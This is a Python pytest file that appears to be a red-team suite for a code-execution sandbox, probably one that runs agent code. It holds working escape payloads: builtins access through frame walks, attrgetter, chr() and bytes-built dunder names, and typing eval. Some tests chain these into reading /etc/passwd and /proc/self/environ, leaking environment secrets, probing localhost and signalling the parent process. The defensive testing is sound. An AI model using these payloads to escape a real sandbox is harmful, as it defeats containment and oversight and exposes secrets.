"""Sandbox escape vector tests.

Red-team test suite that attempts to bypass sandbox guardrails and
achieve code execution, information leakage, or denial of service.

Each test is named for the attack vector it exercises.  Tests that
FAIL (i.e., the guardrail catches the attack) are GOOD -- they prove
the defense works.  Tests that PASS despite the attack code getting
through are VULNERABILITIES that need fixing.

Run with: pytest sandbox/tests/test_escape_vectors.py -v
"""

import textwrap

import pytest

from sandbox.guardrails import validate_code
from sandbox.executor import execute_code


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _validate(source: str) -> list[str]:
    """Validate dedented source and return the violation list."""
    return validate_code(textwrap.dedent(source).strip())


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def minimal_imports():
    """Allowed imports for the minimal profile."""
    return frozenset({
        "math", "statistics", "itertools", "functools", "re",
        "datetime", "collections", "json", "csv", "string",
        "textwrap", "decimal", "fractions", "random", "operator",
        "typing",
    })


# ---------------------------------------------------------------------------
# Section 1: Guardrail Bypass Tests
#
# A test FAILING here means the guardrail caught the attack (GOOD).
# A test PASSING here means the guardrail missed it (VULNERABILITY).
# ---------------------------------------------------------------------------


class TestGuardrailBypasses:
    """Tests that verify guardrails catch malicious code.

    Each test submits a known attack payload to validate_code().  If
    validate_code returns an empty violations list, the guardrail failed
    to detect the attack -- that is a vulnerability.
    """

    @pytest.mark.escape_vector
    def test_globals_builtins_access(self):
        """globals() is not blocked; dict key access bypasses dunder check."""
        code = textwrap.dedent("""\
            g = globals()
            b = g['__builtins__']
            imp = b['__import__'] if isinstance(b, dict) else b.__import__
            os_mod = imp('os')
            print('ESCAPED:', os_mod.getcwd())
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: globals() returns a dict containing "
            "'__builtins__'; dict key access (ast.Subscript) is not "
            "checked for dunder names"
        )

    @pytest.mark.escape_vector
    def test_operator_attrgetter_bypass(self):
        """operator.attrgetter passes dunder as string arg, not ast.Attribute."""
        code = textwrap.dedent("""\
            import operator
            import math
            b = operator.attrgetter('__builtins__')(math)
            imp = b.__import__ if hasattr(b, '__import__') else b['__import__']
            os_mod = imp('os')
            print('ESCAPED:', os_mod.getcwd())
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: operator.attrgetter('__builtins__') passes "
            "the dunder name as a string argument; AST visitor only checks "
            "ast.Attribute nodes, not string constants in call args"
        )

    @pytest.mark.escape_vector
    def test_exception_traceback_frame_walk(self):
        """__traceback__ is not in blocked dunders; frame walk to builtins."""
        code = textwrap.dedent("""\
            try:
                1/0
            except Exception as e:
                frame = e.__traceback__.tb_frame
                b = frame.f_globals['__builtins__']
                imp = b['__import__'] if isinstance(b, dict) else b.__import__
                os_mod = imp('os')
                print('ESCAPED:', os_mod.getcwd())
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: __traceback__ is not in _BLOCKED_DUNDERS; "
            "exception handler can reach tb_frame -> f_globals -> "
            "__builtins__ via dict key access"
        )

    @pytest.mark.escape_vector
    def test_generator_frame_walk(self):
        """Generator gi_frame attribute reaches f_globals -> builtins."""
        code = textwrap.dedent("""\
            def gen():
                yield 1
            g = gen()
            frame = g.gi_frame
            b = frame.f_globals['__builtins__']
            imp = b['__import__'] if isinstance(b, dict) else b.__import__
            os_mod = imp('os')
            print('ESCAPED:', os_mod.getcwd())
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: generator gi_frame -> f_globals -> "
            "__builtins__ via dict key access; gi_frame and f_globals "
            "are not blocked attributes"
        )

    @pytest.mark.escape_vector
    def test_vars_builtins_access(self):
        """vars() is not in blocked calls; vars(module) exposes __builtins__."""
        code = textwrap.dedent("""\
            import math
            d = vars(math)
            b = d['__builtins__']
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: vars() is not a blocked call; "
            "vars(module) returns __dict__ which often contains "
            "__builtins__"
        )

    @pytest.mark.escape_vector
    def test_dynamic_chr_construction(self):
        """chr() can build dunder names dynamically, invisible to AST."""
        code = textwrap.dedent("""\
            name = chr(95)*2 + 'builtins' + chr(95)*2
            b = globals()[name]
            imp = b['__import__'] if isinstance(b, dict) else b.__import__
            os_mod = imp('os')
            print('ESCAPED:', os_mod.getcwd())
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: chr() dynamically constructs '__builtins__' "
            "at runtime; the AST only sees chr(95) calls, not the "
            "resulting string"
        )

    @pytest.mark.escape_vector
    def test_bytes_decode_dunder_construction(self):
        """bytes.decode() builds dunder names from integer sequences."""
        code = textwrap.dedent("""\
            name = bytes([95,95,98,117,105,108,116,105,110,115,95,95]).decode()
            b = globals()[name]
            imp = b['__import__'] if isinstance(b, dict) else b.__import__
            os_mod = imp('os')
            print('ESCAPED:', os_mod.getcwd())
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: bytes([...]).decode() constructs "
            "'__builtins__' from integer ordinals; invisible to "
            "static AST analysis"
        )

    @pytest.mark.escape_vector
    def test_format_string_attribute_traversal(self):
        """Format strings traverse attributes via dotted names in braces."""
        code = textwrap.dedent("""\
            def f(): pass
            leaked = '{0.__globals__}'.format(f)
            print('LEAKED_GLOBALS:', leaked[:200])
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: '{0.__globals__}'.format(f) traverses "
            "dunder attributes via format string mini-language; the "
            "dunder is inside a string literal, not an ast.Attribute"
        )

    @pytest.mark.escape_vector
    def test_class_chain_reconnaissance(self):
        """__class__, __bases__ not blocked; exposes object hierarchy."""
        code = textwrap.dedent("""\
            obj_class = ().__class__.__bases__[0]
            print('OBJECT:', obj_class)
            print('DICT:', obj_class.__dict__.keys())
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: __class__, __bases__, __dict__ are not "
            "in _BLOCKED_DUNDERS; allows object hierarchy traversal "
            "for subclass exploitation"
        )

    @pytest.mark.escape_vector
    def test_metaclass_globals_escape(self):
        """Metaclass __new__ runs at class definition; accesses globals()."""
        code = textwrap.dedent("""\
            class Meta(type):
                def __new__(mcs, name, bases, ns):
                    b = globals()['__builtins__']
                    imp = b['__import__'] if isinstance(b, dict) else b.__import__
                    os_mod = imp('os')
                    print('ESCAPED:', os_mod.getcwd())
                    return super().__new__(mcs, name, bases, ns)

            class Exploit(metaclass=Meta):
                pass
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: metaclass __new__ executes at class "
            "definition time; globals()['__builtins__'] via dict key "
            "access is not caught"
        )

    @pytest.mark.escape_vector
    def test_operator_methodcaller_bypass(self):
        """operator.methodcaller invokes methods by string name."""
        code = textwrap.dedent("""\
            import operator
            import math
            mc = operator.methodcaller('__init__')
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: operator.methodcaller('__init__') "
            "invokes dunder methods via string name; AST sees only "
            "a string constant, not an attribute access"
        )

    @pytest.mark.escape_vector
    def test_functools_reduce_attrgetter_chain(self):
        """functools.reduce chains attrgetter calls to walk dunders."""
        code = textwrap.dedent("""\
            import functools
            import operator
            attrs = ['__class__', '__bases__']
            result = functools.reduce(
                lambda obj, attr: operator.attrgetter(attr)(obj),
                attrs, ()
            )
            print('CHAIN:', result)
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: functools.reduce + operator.attrgetter "
            "chains dunder traversal via string arguments; fully "
            "invisible to static AST checks"
        )

    @pytest.mark.escape_vector
    def test_locals_builtins_access(self):
        """locals() is not blocked; at module level it equals globals()."""
        code = textwrap.dedent("""\
            l = locals()
            b = l['__builtins__']
            imp = b['__import__'] if isinstance(b, dict) else b.__import__
            os_mod = imp('os')
            print('ESCAPED:', os_mod.getcwd())
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: locals() is not a blocked call; at "
            "module scope locals() == globals(), providing access to "
            "__builtins__ via dict key"
        )

    @pytest.mark.escape_vector
    def test_bare_builtins_name_reference(self):
        """__builtins__ as a bare name (ast.Name) bypasses attribute checks."""
        code = textwrap.dedent("""\
            b = __builtins__
            imp = b.__import__
            os_mod = imp('os')
            print('ESCAPED:', os_mod.getcwd())
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: __builtins__ as a bare ast.Name reference "
            "is not caught by visit_Attribute (which only checks "
            "ast.Attribute nodes)"
        )

    @pytest.mark.escape_vector
    def test_bare_builtins_open_method(self):
        """Chain: bare __builtins__ -> .open() to read files."""
        code = textwrap.dedent("""\
            b = __builtins__
            f = b.open('/etc/passwd', 'r')
            print(f.read())
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: __builtins__.open() bypasses _BLOCKED_CALLS "
            "because the call check only fires on ast.Name, not method "
            "calls on objects"
        )


# ---------------------------------------------------------------------------
# Section 1a: Module Attribute Traversal Tests
# ---------------------------------------------------------------------------


class TestModuleAttributeTraversal:
    """Tests for accessing dangerous modules through allowed modules."""

    @pytest.mark.escape_vector
    def test_random_os_escape(self):
        """random._os is a direct reference to the os module."""
        code = textwrap.dedent("""\
            import random
            random._os.system('id')
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: random._os gives direct access to the "
            "os module, enabling os.system() command execution"
        )

    @pytest.mark.escape_vector
    def test_random_os_environ_leak(self):
        """random._os.environ leaks environment variables."""
        code = textwrap.dedent("""\
            import random
            print(dict(random._os.environ))
        """)
        violations = validate_code(code)
        assert violations, (
            "GUARDRAIL BYPASS: random._os.environ leaks all "
            "environment variables including secrets"
        )

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_random_os_runtime_purge(self):
        """Runtime preamble should purge _os from random module."""
        code = textwrap.dedent("""\
            import random
            print('has _os:', hasattr(random, '_os'))
        """)
        violations = validate_code(code)
        if violations:
            pytest.skip("Guardrail caught _os attribute access (good)")
        result = await execute_code(code, timeout=5.0)
        assert "True" not in result.stdout, (
            f"RUNTIME BYPASS: random._os still accessible after purge: "
            f"{result.stdout!r}"
        )


# ---------------------------------------------------------------------------
# Section 1b: Eval-Based Bypass Tests
#
# Tests for vectors that use allowed modules to eval() strings,
# bypassing AST guardrails entirely.
# ---------------------------------------------------------------------------


class TestEvalBypasses:
    """Tests for modules that eval() user-controlled strings at runtime.

    typing.get_type_hints evaluates string annotations via eval().
    The annotation string passes AST checks (it's just a string literal)
    but gets executed as Python code at runtime.
    """

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_typing_get_type_hints_eval_bypass(self):
        """typing.get_type_hints evals annotations; runtime hook must block os."""
        code = textwrap.dedent("""\
            import typing

            class X:
                a: 'type(print(__import__(\"os\").getcwd()))'

            typing.get_type_hints(X)
        """)
        # AST guardrails won't catch this — the annotation is just a string.
        # The runtime import hook must block __import__('os') from __main__.
        violations = validate_code(code)
        if violations:
            pytest.skip("Guardrail caught this (good but unexpected)")
        result = await execute_code(code, timeout=5.0)
        assert "ESCAPED" not in result.stdout and result.exit_code != 0, (
            f"EVAL BYPASS: typing.get_type_hints executed os.getcwd(): "
            f"stdout={result.stdout!r}"
        )

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_typing_eval_env_leak(self):
        """typing.get_type_hints can leak env vars if os import succeeds."""
        code = textwrap.dedent("""\
            import typing

            class X:
                a: 'type(print(__import__(\"os\").environ.get(\"HOME\", \"blocked\")))'

            try:
                typing.get_type_hints(X)
            except Exception:
                pass
        """)
        violations = validate_code(code)
        if violations:
            pytest.skip("Guardrail caught this (good)")
        result = await execute_code(code, timeout=5.0)
        # If HOME appears in output, the env leak succeeded
        assert "/home" not in result.stdout.lower() and "/root" not in result.stdout.lower() and "/Users" not in result.stdout, (
            f"ENV LEAK via typing eval: stdout={result.stdout!r}"
        )


# ---------------------------------------------------------------------------
# Section 2: Execution Tests
#
# For vectors that bypass guardrails AND achieve code execution, these
# tests confirm the vulnerability is real, not theoretical.
# ---------------------------------------------------------------------------


class TestExecutionEscapes:
    """Tests that prove a guardrail bypass leads to real code execution.

    These are async tests that run the full pipeline: validate_code()
    followed by execute_code().  If the guardrail catches the payload,
    the test skips (that is the desired outcome).
    """

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_globals_escape_executes(self):
        """Proves globals() -> __builtins__ -> __import__ achieves execution."""
        code = textwrap.dedent("""\
            g = globals()
            b = g['__builtins__']
            imp = b['__import__'] if isinstance(b, dict) else b.__import__
            os_mod = imp('os')
            print('ESCAPED:', os_mod.getcwd())
        """)
        violations = validate_code(code)
        if violations:
            pytest.skip("Guardrail caught this (good)")
        result = await execute_code(code, timeout=5.0)
        assert result.exit_code != 0 or "ESCAPED:" not in result.stdout, (
            f"ESCAPE SUCCESSFUL via globals(): stdout={result.stdout!r}"
        )

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_operator_attrgetter_escape_executes(self):
        """Proves operator.attrgetter('__builtins__') achieves execution."""
        code = textwrap.dedent("""\
            import operator
            import math
            b = operator.attrgetter('__builtins__')(math)
            imp = b.__import__ if hasattr(b, '__import__') else b['__import__']
            os_mod = imp('os')
            print('ESCAPED:', os_mod.getcwd())
        """)
        violations = validate_code(code)
        if violations:
            pytest.skip("Guardrail caught this (good)")
        result = await execute_code(code, timeout=5.0)
        assert result.exit_code != 0 or "ESCAPED:" not in result.stdout, (
            f"ESCAPE SUCCESSFUL via operator.attrgetter: stdout={result.stdout!r}"
        )

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_traceback_frame_escape_executes(self):
        """Proves exception traceback frame walk achieves execution."""
        code = textwrap.dedent("""\
            try:
                1/0
            except Exception as e:
                frame = e.__traceback__.tb_frame
                b = frame.f_globals['__builtins__']
                imp = b['__import__'] if isinstance(b, dict) else b.__import__
                os_mod = imp('os')
                print('ESCAPED:', os_mod.getcwd())
        """)
        violations = validate_code(code)
        if violations:
            pytest.skip("Guardrail caught this (good)")
        result = await execute_code(code, timeout=5.0)
        assert result.exit_code != 0 or "ESCAPED:" not in result.stdout, (
            f"ESCAPE SUCCESSFUL via traceback frame walk: stdout={result.stdout!r}"
        )

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_generator_frame_escape_executes(self):
        """Proves generator gi_frame -> f_globals walk achieves execution."""
        code = textwrap.dedent("""\
            def gen():
                yield 1
            g = gen()
            frame = g.gi_frame
            b = frame.f_globals['__builtins__']
            imp = b['__import__'] if isinstance(b, dict) else b.__import__
            os_mod = imp('os')
            print('ESCAPED:', os_mod.getcwd())
        """)
        violations = validate_code(code)
        if violations:
            pytest.skip("Guardrail caught this (good)")
        result = await execute_code(code, timeout=5.0)
        assert result.exit_code != 0 or "ESCAPED:" not in result.stdout, (
            f"ESCAPE SUCCESSFUL via generator frame walk: stdout={result.stdout!r}"
        )

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_dynamic_chr_escape_executes(self):
        """Proves chr()-constructed dunder name achieves execution."""
        code = textwrap.dedent("""\
            name = chr(95)*2 + 'builtins' + chr(95)*2
            b = globals()[name]
            imp = b['__import__'] if isinstance(b, dict) else b.__import__
            os_mod = imp('os')
            print('ESCAPED:', os_mod.getcwd())
        """)
        violations = validate_code(code)
        if violations:
            pytest.skip("Guardrail caught this (good)")
        result = await execute_code(code, timeout=5.0)
        assert result.exit_code != 0 or "ESCAPED:" not in result.stdout, (
            f"ESCAPE SUCCESSFUL via chr() construction: stdout={result.stdout!r}"
        )

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_bytes_decode_escape_executes(self):
        """Proves bytes.decode() dunder construction achieves execution."""
        code = textwrap.dedent("""\
            name = bytes([95,95,98,117,105,108,116,105,110,115,95,95]).decode()
            b = globals()[name]
            imp = b['__import__'] if isinstance(b, dict) else b.__import__
            os_mod = imp('os')
            print('ESCAPED:', os_mod.getcwd())
        """)
        violations = validate_code(code)
        if violations:
            pytest.skip("Guardrail caught this (good)")
        result = await execute_code(code, timeout=5.0)
        assert result.exit_code != 0 or "ESCAPED:" not in result.stdout, (
            f"ESCAPE SUCCESSFUL via bytes.decode(): stdout={result.stdout!r}"
        )

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_metaclass_escape_executes(self):
        """Proves metaclass __new__ + globals() achieves execution."""
        code = textwrap.dedent("""\
            class Meta(type):
                def __new__(mcs, name, bases, ns):
                    b = globals()['__builtins__']
                    imp = b['__import__'] if isinstance(b, dict) else b.__import__
                    os_mod = imp('os')
                    print('ESCAPED:', os_mod.getcwd())
                    return super().__new__(mcs, name, bases, ns)

            class Exploit(metaclass=Meta):
                pass
        """)
        violations = validate_code(code)
        if violations:
            pytest.skip("Guardrail caught this (good)")
        result = await execute_code(code, timeout=5.0)
        assert result.exit_code != 0 or "ESCAPED:" not in result.stdout, (
            f"ESCAPE SUCCESSFUL via metaclass: stdout={result.stdout!r}"
        )


# ---------------------------------------------------------------------------
# Section 3: Information Leak Tests
# ---------------------------------------------------------------------------


class TestInfoLeaks:
    """Tests for information leakage through /proc, error messages, etc.

    These chain a guardrail bypass with filesystem reads to prove
    sensitive data can be exfiltrated from the sandbox.
    """

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_proc_self_environ_leak(self):
        """Chains globals() bypass with /proc/self/environ read."""
        code = textwrap.dedent("""\
            g = globals()
            b = g['__builtins__']
            imp = b['__import__'] if isinstance(b, dict) else b.__import__
            os_mod = imp('os')
            try:
                with imp('builtins').open('/proc/self/environ', 'rb') as f:
                    env = f.read().decode('utf-8', errors='replace')
                    print('ENV_LEAK:', env[:500])
            except Exception as ex:
                print('BLOCKED:', ex)
        """)
        violations = validate_code(code)
        if violations:
            pytest.skip("Guardrail caught this (good)")
        result = await execute_code(code, timeout=5.0)
        assert "ENV_LEAK:" not in result.stdout, (
            f"INFO LEAK: /proc/self/environ readable: "
            f"stdout={result.stdout[:200]!r}"
        )

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_tmp_listing_leak(self):
        """Chains globals() bypass with /tmp directory listing."""
        code = textwrap.dedent("""\
            g = globals()
            b = g['__builtins__']
            imp = b['__import__'] if isinstance(b, dict) else b.__import__
            os_mod = imp('os')
            print('TMP_FILES:', os_mod.listdir('/tmp'))
        """)
        violations = validate_code(code)
        if violations:
            pytest.skip("Guardrail caught this (good)")
        result = await execute_code(code, timeout=5.0)
        assert "TMP_FILES:" not in result.stdout, (
            f"INFO LEAK: /tmp listing accessible: "
            f"stdout={result.stdout[:200]!r}"
        )

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_format_string_globals_leak(self):
        """Format string traverses __globals__ to leak function internals."""
        code = textwrap.dedent("""\
            def f(): pass
            leaked = '{0.__globals__}'.format(f)
            print('LEAKED_GLOBALS:', leaked[:200])
        """)
        violations = validate_code(code)
        if violations:
            pytest.skip("Guardrail caught this (good)")
        result = await execute_code(code, timeout=5.0)
        assert "LEAKED_GLOBALS:" not in result.stdout, (
            f"INFO LEAK: format string exposed __globals__: "
            f"stdout={result.stdout[:200]!r}"
        )


# ---------------------------------------------------------------------------
# Section 4: Resource Exhaustion Tests
# ---------------------------------------------------------------------------


class TestResourceExhaustion:
    """Tests for denial-of-service via resource consumption.

    These verify that the sandbox enforces memory and disk limits.
    """

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_memory_exhaustion(self):
        """Attempt to allocate 200MB in a memory-limited sandbox."""
        code = textwrap.dedent("""\
            x = bytearray(200 * 1024 * 1024)
            print('ALLOCATED:', len(x))
        """)
        # This payload uses no blocked calls -- it is pure Python.
        # The guardrail won't catch it; the OS/container limits must.
        result = await execute_code(code, timeout=5.0)
        assert "ALLOCATED:" not in result.stdout or result.exit_code != 0, (
            f"RESOURCE EXHAUSTION: 200MB allocation succeeded: "
            f"stdout={result.stdout!r}"
        )

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_tmp_fill_exhaustion(self):
        """Chains globals() bypass with /tmp fill (10Mi emptyDir limit)."""
        code = textwrap.dedent("""\
            g = globals()
            b = g['__builtins__']
            imp = b['__import__'] if isinstance(b, dict) else b.__import__
            builtins = imp('builtins')
            with builtins.open('/tmp/fill_test', 'wb') as f:
                f.write(b'A' * (15 * 1024 * 1024))
            print('FILLED /tmp')
        """)
        violations = validate_code(code)
        if violations:
            pytest.skip("Guardrail caught this (good)")
        result = await execute_code(code, timeout=5.0)
        assert "FILLED /tmp" not in result.stdout, (
            f"RESOURCE EXHAUSTION: wrote 15MB to /tmp (exceeds 10Mi "
            f"emptyDir): stdout={result.stdout!r}"
        )


# ---------------------------------------------------------------------------
# Section 5: Network Escape Tests
# ---------------------------------------------------------------------------


class TestNetworkEscape:
    """Tests for network-based escapes (localhost probes, DNS)."""

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_localhost_probe(self):
        """Chains globals() bypass with localhost TCP connect."""
        code = textwrap.dedent("""\
            g = globals()
            b = g['__builtins__']
            imp = b['__import__'] if isinstance(b, dict) else b.__import__
            sock = imp('socket')
            s = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
            s.settimeout(2)
            try:
                s.connect(('127.0.0.1', 8080))
                print('CONNECTED to agent on 8080!')
                s.close()
            except Exception as e:
                print('CONNECT_FAILED:', e)
        """)
        violations = validate_code(code)
        if violations:
            pytest.skip("Guardrail caught this (good)")
        result = await execute_code(code, timeout=5.0)
        assert "CONNECTED" not in result.stdout, (
            f"NETWORK ESCAPE: connected to localhost:8080: "
            f"stdout={result.stdout!r}"
        )


# ---------------------------------------------------------------------------
# Section 6: Signal / Process Escape Tests
# ---------------------------------------------------------------------------


class TestProcessEscape:
    """Tests for process-level escapes (signals to parent, PID info)."""

    @pytest.mark.escape_vector
    @pytest.mark.asyncio
    async def test_signal_parent_process(self):
        """Chains globals() bypass with SIGTERM to parent (FastAPI server)."""
        code = textwrap.dedent("""\
            g = globals()
            b = g['__builtins__']
            imp = b['__import__'] if isinstance(b, dict) else b.__import__
            os_mod = imp('os')
            signal_mod = imp('signal')
            ppid = os_mod.getppid()
            print('PARENT_PID:', ppid)
            try:
                os_mod.kill(ppid, signal_mod.SIGTERM)
                print('SIGNAL_SENT')
            except Exception as e:
                print('SIGNAL_BLOCKED:', e)
        """)
        violations = validate_code(code)
        if violations:
            pytest.skip("Guardrail caught this (good)")
        # DO NOT actually execute this -- it would kill our test runner.
        # The fact that it passes guardrails is the vulnerability.
        pytest.fail(
            "GUARDRAIL BYPASS: signal-to-parent payload passed "
            "validate_code(); would kill the FastAPI server if executed"
        )
